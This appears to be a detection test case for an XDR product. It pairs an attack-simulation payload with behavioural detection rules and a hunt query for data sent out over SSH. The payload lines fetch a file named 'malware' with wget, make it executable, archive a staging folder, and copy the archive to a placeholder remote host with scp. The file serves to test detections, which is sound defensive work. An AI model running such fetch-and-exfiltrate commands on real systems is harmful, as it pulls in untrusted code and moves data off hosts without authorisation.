identity.description: An attacker stages data and compresses it into a tar.gz archive, then pipes the archive over an outbound SSH session to exfiltrate the data. Cortex should detect this behavior as a compressed file being exfiltrated over SSH.

payload.code:
mkdir -p /tmp/stage
wget -O /tmp/stage/data.txt http://192.0.2.10/malware
chmod +x /tmp/stage/data.txt
tar -czf /tmp/stage/data.tar.gz -C /tmp/stage .
scp /tmp/stage/data.tar.gz user@192.0.2.5:/tmp/

expected_artifacts.description: Outbound SSH connection to remote IP

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: SSH Exfiltration Process
biocs.description: Process starts SCP with a file path to a remote IP
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'scp' and action_file_path = '/tmp/stage/data.tar.gz'
| filter action_remote_ip = '192.0.2.5'

abiocs.name: A compressed file was exfiltrated over SSH
abiocs.description: Detection of a tar.gz file being sent over SSH to a remote IP
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK
| filter dst_port = 22 and action_remote_ip = '192.0.2.5'
| filter action_file_path contains '.tar.gz'
| filter action_process_image_name = 'scp'

xql_queries.name: SSH Exfiltration Hunt
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.NETWORK
| filter dst_port = 22 and action_remote_ip = '192.0.2.5'
| filter action_file_path contains '.tar.gz'
| filter action_process_image_name = 'scp'
| fields agent_hostname, action_file_path, action_remote_ip, dst_port
